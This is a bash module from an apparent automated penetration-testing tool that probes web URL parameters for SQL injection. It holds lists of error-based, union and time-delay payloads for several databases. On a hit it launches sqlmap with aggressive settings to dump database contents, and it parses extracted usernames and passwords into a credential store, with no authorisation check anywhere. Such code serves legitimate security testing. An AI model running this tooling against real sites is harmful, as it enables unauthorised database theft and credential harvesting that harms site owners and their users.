#!/bin/bash

# SQL Injection Testing Module
# Tests for Error-based, Boolean-based, Time-based, and Union-based SQLi

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main SQLi testing function
test_sqli() {
    local url=$1
    local project_id=$2

    log_info "Testing SQL Injection on $url"

    # Test error-based SQLi first (fastest detection)
    if test_error_based_sqli "$url" "$project_id"; then
        # If error-based found, launch SQLMap for full exploitation
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    # Test boolean-based blind SQLi
    if test_boolean_based_sqli "$url" "$project_id"; then
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    # Test time-based blind SQLi (slowest, run last)
    if test_time_based_sqli "$url" "$project_id"; then
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    log_debug "[SQLi] No SQL injection vulnerabilities detected"
    return 1
}

# Test error-based SQL injection
test_error_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Error-based SQL Injection"

    # Error-based payloads for different databases
    local payloads=(
        "'"
        "''"
        "\""
        "1' OR '1'='1"
        "1' OR '1'='1' --"
        "1' OR '1'='1' /*"
        "1' OR '1'='1' #"
        "' OR 1=1--"
        "' OR 1=1#"
        "' OR 1=1/*"
        "admin' --"
        "admin' #"
        "admin'/*"
        "' OR 'x'='x"
        "' OR 'a'='a"
        "1' AND '1'='2"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "' UNION SELECT NULL,NULL,NULL--"
        # MySQL specific
        "' AND 1=CONVERT(int, (SELECT @@version))--"
        "' AND 1=CONVERT(int, (SELECT user()))--"
        # PostgreSQL specific
        "' AND 1=CAST((SELECT version()) AS int)--"
        # MSSQL specific
        "' AND 1=CONVERT(int, @@version)--"
        # Oracle specific
        "' AND 1=CAST(banner AS number) FROM v\$version WHERE rownum=1--"
    )

    # SQL error patterns for different databases
    local error_patterns=(
        # Generic
        "sql"
        "mysql"
        "postgresql"
        "postgres"
        "oracle"
        "microsoft"
        "odbc"
        "jdbc"
        "syntax error"
        "syntax near"
        "unexpected"
        "warning"
        # MySQL
        "You have an error in your SQL syntax"
        "mysql_fetch"
        "mysql_num_rows"
        "mysqli"
        "mysql_query"
        # PostgreSQL
        "pg_query"
        "pg_exec"
        "ERROR.*syntax"
        "unterminated quoted string"
        # MSSQL
        "Microsoft SQL"
        "ODBC SQL Server Driver"
        "SQLServer JDBC Driver"
        "Unclosed quotation mark"
        # Oracle
        "ORA-[0-9]"
        "Oracle error"
        "quoted string not properly terminated"
    )

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        # Test common parameter names
        local common_params=("id" "page" "pid" "category" "user" "userid" "item" "product")
        for param in "${common_params[@]}"; do
            if test_sqli_parameter_error "$url" "$param" "$project_id" "${payloads[@]}"; then
                return 0
            fi
        done
    else
        # Test each parameter
        while read -r param; do
            if test_sqli_parameter_error "$url" "$param" "$project_id" "${payloads[@]}"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test SQLi on specific parameter (error-based)
test_sqli_parameter_error() {
    local base_url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[SQLi] Testing parameter for errors: $param"

    for payload in "${payloads[@]}"; do
        # Build test URL
        local test_url=$(build_test_url "$base_url" "$param" "$payload")

        # Send request
        local response=$(curl -s -L --max-time 10 \
                         -A "Mozilla/5.0" \
                         -w "\n---HTTP_CODE:%{http_code}---" \
                         "$test_url" 2>/dev/null)

        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local http_code=$(echo "$response" | grep -o "---HTTP_CODE:[0-9]*" | cut -d: -f2)

        # Check for SQL errors
        local error_found=""
        local detected_db=""

        # MySQL errors
        if echo "$body" | grep -qiE "mysql|You have an error in your SQL syntax"; then
            error_found="yes"
            detected_db="MySQL"
        # PostgreSQL errors
        elif echo "$body" | grep -qiE "postgresql|postgres|pg_|ERROR.*syntax"; then
            error_found="yes"
            detected_db="PostgreSQL"
        # MSSQL errors
        elif echo "$body" | grep -qiE "Microsoft SQL|ODBC SQL Server|SQLServer JDBC"; then
            error_found="yes"
            detected_db="Microsoft SQL Server"
        # Oracle errors
        elif echo "$body" | grep -qiE "ORA-[0-9]|Oracle"; then
            error_found="yes"
            detected_db="Oracle"
        # Generic SQL errors
        elif echo "$body" | grep -qiE "sql.*error|syntax.*error|database.*error"; then
            error_found="yes"
            detected_db="Unknown SQL Database"
        fi

        if [ -n "$error_found" ]; then
            log_critical "[SQLi] Error-based SQL Injection found in parameter '$param'!"

            # Extract actual error message
            local error_msg=$(echo "$body" | grep -ioE "(mysql|postgresql|oracle|sql).*error[^<]*" | head -1)

            db_add_finding "$project_id" "critical" "sqli_error_based" \
                "SQL Injection - Error Based (${detected_db})" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\nDatabase Type: $detected_db\n\nSQL error message detected in response:\n$error_msg\n\nThis indicates the application is vulnerable to SQL injection attacks." \
                "" "9.8" \
                "1. Use prepared statements (parameterized queries) - the ONLY effective defense\n2. Use stored procedures (with proper parameter handling)\n3. Input validation and sanitization as secondary defense\n4. Escape all user input\n5. Use least privilege database accounts\n6. Disable detailed error messages in production\n7. Implement WAF rules for SQL injection patterns"

            # Save evidence
            save_sqli_evidence "$project_id" "$test_url" "$payload" "$body" "error_based"

            return 0
        fi
    done

    return 1
}

# Test boolean-based blind SQL injection
test_boolean_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Boolean-based Blind SQL Injection"

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("id" "page" "pid")
        for param in "${common_params[@]}"; do
            if test_boolean_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_boolean_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test boolean SQLi on specific parameter
test_boolean_sqli_param() {
    local base_url=$1
    local param=$2
    local project_id=$3

    log_debug "[SQLi] Testing boolean-based SQLi on parameter: $param"

    # Get baseline response (true condition)
    local baseline_url=$(build_test_url "$base_url" "$param" "1")
    local baseline_response=$(curl -s -L --max-time 10 "$baseline_url")
    local baseline_length=${#baseline_response}

    # Test true condition (should return same as baseline)
    local true_payload="1 AND 1=1"
    local true_url=$(build_test_url "$base_url" "$param" "$true_payload")
    local true_response=$(curl -s -L --max-time 10 "$true_url")
    local true_length=${#true_response}

    # Test false condition (should return different response)
    local false_payload="1 AND 1=2"
    local false_url=$(build_test_url "$base_url" "$param" "$false_payload")
    local false_response=$(curl -s -L --max-time 10 "$false_url")
    local false_length=${#false_response}

    # Calculate similarity
    local true_diff=$((baseline_length - true_length))
    local false_diff=$((baseline_length - false_length))

    # Make differences absolute
    [ $true_diff -lt 0 ] && true_diff=$((-true_diff))
    [ $false_diff -lt 0 ] && false_diff=$((-false_diff))

    # If true condition similar to baseline, but false condition very different
    if [ $true_diff -lt 100 ] && [ $false_diff -gt 500 ]; then
        log_success "[SQLi] Boolean-based Blind SQL Injection found in parameter '$param'!"

        db_add_finding "$project_id" "critical" "sqli_boolean_blind" \
            "SQL Injection - Boolean-based Blind" \
            "URL: $base_url\nParameter: $param\n\nTrue payload: $true_payload\nTrue response length: $true_length\n\nFalse payload: $false_payload\nFalse response length: $false_length\n\nBaseline length: $baseline_length\n\nThe application returns different responses for TRUE and FALSE SQL conditions, indicating boolean-based blind SQL injection vulnerability." \
            "" "9.5" \
            "1. Use prepared statements (parameterized queries)\n2. Implement proper input validation\n3. Use ORM frameworks with proper configuration\n4. Apply principle of least privilege for database accounts"

        save_sqli_evidence "$project_id" "$true_url" "$true_payload" "$true_response" "boolean_blind"

        return 0
    fi

    return 1
}

# Test time-based blind SQL injection
test_time_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Time-based Blind SQL Injection (this may take a while)"

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("id" "page" "pid")
        for param in "${common_params[@]}"; do
            if test_time_based_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_time_based_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test time-based SQLi on specific parameter
test_time_based_sqli_param() {
    local base_url=$1
    local param=$2
    local project_id=$3

    log_debug "[SQLi] Testing time-based SQLi on parameter: $param"

    # Get baseline response time
    local start=$(date +%s)
    curl -s -L --max-time 15 "$(build_test_url "$base_url" "$param" "1")" > /dev/null
    local end=$(date +%s)
    local baseline_time=$((end - start))

    log_debug "[SQLi] Baseline response time: ${baseline_time}s"

    # Time-based payloads for different databases (5 second delay)
    local delay=5
    local payloads=(
        # MySQL
        "1' AND SLEEP($delay)--"
        "1' AND SLEEP($delay)#"
        "1 AND SLEEP($delay)"
        # PostgreSQL
        "1' AND pg_sleep($delay)--"
        "1 AND pg_sleep($delay)"
        # MSSQL
        "1' WAITFOR DELAY '0:0:$delay'--"
        "1 WAITFOR DELAY '0:0:$delay'"
        # Oracle
        "1' AND DBMS_LOCK.SLEEP($delay)--"
        # Generic
        "1' AND (SELECT * FROM (SELECT(SLEEP($delay)))a)--"
    )

    for payload in "${payloads[@]}"; do
        log_debug "[SQLi] Testing time payload: $payload"

        local test_url=$(build_test_url "$base_url" "$param" "$payload")

        local start=$(date +%s)
        curl -s -L --max-time 15 "$test_url" > /dev/null 2>&1
        local end=$(date +%s)
        local response_time=$((end - start))

        log_debug "[SQLi] Response time with payload: ${response_time}s"

        # If response time is significantly longer (within 1 second of expected delay)
        local expected_time=$((baseline_time + delay))
        local time_diff=$((response_time - expected_time))
        [ $time_diff -lt 0 ] && time_diff=$((-time_diff))

        if [ $response_time -ge $((delay - 1)) ] && [ $time_diff -le 2 ]; then
            log_critical "[SQLi] Time-based Blind SQL Injection found in parameter '$param'!"

            # Determine database type from payload
            local db_type="Unknown"
            [[ "$payload" == *"SLEEP"* ]] && db_type="MySQL"
            [[ "$payload" == *"pg_sleep"* ]] && db_type="PostgreSQL"
            [[ "$payload" == *"WAITFOR"* ]] && db_type="Microsoft SQL Server"
            [[ "$payload" == *"DBMS_LOCK"* ]] && db_type="Oracle"

            db_add_finding "$project_id" "critical" "sqli_time_blind" \
                "SQL Injection - Time-based Blind (${db_type})" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nBaseline response time: ${baseline_time}s\nPayload response time: ${response_time}s\nExpected delay: ${delay}s\n\nThe application response is delayed when time-based SQL injection payloads are injected, confirming blind SQL injection vulnerability." \
                "" "9.3" \
                "1. Use prepared statements (parameterized queries) - the PRIMARY defense\n2. Use stored procedures with parameter binding\n3. Implement input validation\n4. Use ORM frameworks correctly\n5. Monitor and alert on slow queries\n6. Apply principle of least privilege"

            save_sqli_evidence "$project_id" "$test_url" "$payload" "Time-based response: ${response_time}s" "time_blind"

            return 0
        fi
    done

    return 1
}

# Full exploitation with SQLMap
test_sqli_with_sqlmap() {
    local url=$1
    local project_id=$2

    # Check if sqlmap is installed
    if ! command -v sqlmap &> /dev/null; then
        log_warn "[SQLi] SQLMap not installed, skipping automated exploitation"
        return 1
    fi

    log_info "[SQLi] Launching SQLMap for deep exploitation"

    local output_dir="data/projects/${project_id}/scans/sqlmap_$(date +%s)"
    mkdir -p "$output_dir"

    # Run SQLMap with aggressive settings
    sqlmap -u "$url" \
           --batch \
           --level=5 \
           --risk=3 \
           --dbms=all \
           --technique=BEUSTQ \
           --threads=5 \
           --random-agent \
           --tamper=space2comment \
           --output-dir="$output_dir" \
           --dump-format=CSV \
           2>&1 | tee "${output_dir}/sqlmap_output.txt"

    # Parse SQLMap results
    if [ -f "${output_dir}/sqlmap_output.txt" ]; then
        parse_sqlmap_results "$project_id" "${output_dir}/sqlmap_output.txt"
    fi
}

# Parse SQLMap output
parse_sqlmap_results() {
    local project_id=$1
    local output_file=$2

    log_info "[SQLi] Parsing SQLMap results"

    # Extract database type
    local db_type=$(grep -oP "back-end DBMS: \K.*" "$output_file" | head -1)

    # Extract databases
    local databases=$(grep -oP "available databases \[\d+\]:" -A 50 "$output_file" | grep "\[*\]" | sed 's/\[*\]//')

    # Extract tables
    local tables=$(grep -oP "Database: .*" "$output_file")

    # Check if data was dumped
    if grep -q "dumped to CSV file" "$output_file"; then
        log_critical "[SQLi] SQLMap successfully dumped database contents!"

        db_add_finding "$project_id" "critical" "sqli_data_exfiltration" \
            "SQL Injection - Data Exfiltration Successful" \
            "Database Type: $db_type\n\nDatabases found:\n$databases\n\nTables found:\n$tables\n\nSQLMap successfully extracted data from the database. See output at: $output_file" \
            "" "10.0" \
            "IMMEDIATE ACTION REQUIRED:\n1. Take affected system offline\n2. Patch SQL injection vulnerability using prepared statements\n3. Change all database credentials\n4. Audit logs for unauthorized access\n5. Assess data breach scope\n6. Consider incident response procedures"
    fi

    # Extract credentials if found
    if grep -q "password" "$output_file"; then
        parse_sqlmap_credentials "$project_id" "$output_file"
    fi
}

# Parse credentials from SQLMap
parse_sqlmap_credentials() {
    local project_id=$1
    local output_file=$2

    grep -A 5 "password" "$output_file" | while read -r line; do
        if echo "$line" | grep -qE "\|.*\|.*\|"; then
            local username=$(echo "$line" | cut -d'|' -f2 | tr -d ' ')
            local password=$(echo "$line" | cut -d'|' -f3 | tr -d ' ')

            if [ -n "$username" ] && [ -n "$password" ]; then
                db_add_credential "$project_id" "$username" "$password" "SQLi extraction"
                log_success "[SQLi] Credential extracted: $username"
            fi
        fi
    done
}

# Helper: Build test URL with parameter
build_test_url() {
    local base_url=$1
    local param=$2
    local value=$3

    # URL encode value
    local encoded_value=$(urlencode "$value")

    if [[ "$base_url" == *"?"* ]]; then
        if [[ "$base_url" == *"$param="* ]]; then
            # Replace existing parameter
            echo "$base_url" | sed "s/$param=[^&]*/$param=$encoded_value/"
        else
            # Add new parameter
            echo "${base_url}&${param}=${encoded_value}"
        fi
    else
        # Add first parameter
        echo "${base_url}?${param}=${encoded_value}"
    fi
}

# Helper: Extract URL parameters
extract_url_parameters() {
    local url=$1

    if [[ "$url" != *"?"* ]]; then
        return 1
    fi

    local query_string="${url#*\?}"
    echo "$query_string" | tr '&' '\n' | cut -d= -f1
}

# Helper: URL encode
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done

    echo "$encoded"
}

# Helper: Save SQLi evidence
save_sqli_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4
    local type=$5

    local evidence_dir="data/projects/${project_id}/evidence/sqli"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local evidence_file="${evidence_dir}/sqli_${type}_${timestamp}.txt"

    cat > "$evidence_file" <<EOF
SQL Injection Evidence - ${type}
URL: $url
Payload: $payload
Captured: $(date)

Response:
$response
EOF

    log_debug "[SQLi] Evidence saved to: $evidence_file"
}

# Export functions
export -f test_sqli
export -f test_error_based_sqli
export -f test_boolean_based_sqli
export -f test_time_based_sqli
export -f test_sqli_with_sqlmap
